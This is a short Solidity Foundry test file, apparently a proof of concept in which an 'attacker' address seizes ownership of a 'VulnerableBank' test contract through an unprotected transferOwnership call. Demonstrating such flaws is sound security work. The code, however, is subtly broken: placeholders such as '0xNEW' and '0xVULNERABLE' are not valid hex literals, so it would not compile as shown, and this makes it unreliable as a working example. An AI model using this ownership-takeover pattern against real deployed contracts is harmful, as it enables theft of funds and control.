// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "./basetest.sol";
import "../src/VulnerableBank.sol";

contract PocTest is BaseTestWithBalanceLog {
    VulnerableBank target;
    address attacker = address(0xBAD);

    function setUp() public {
        target = new VulnerableBank();
        vm.deal(attacker, 10 ether);
        target.transferOwnership(vm.addr(0xNEW));
    }

    function testExploit() public balanceLog {
        // Demonstrate the vulnerability
        vm.prank(attacker);
        target.transferOwnership(address(0xVULNERABLE));
        assertEq(target.owner(), address(0xVULNERABLE));
    }
}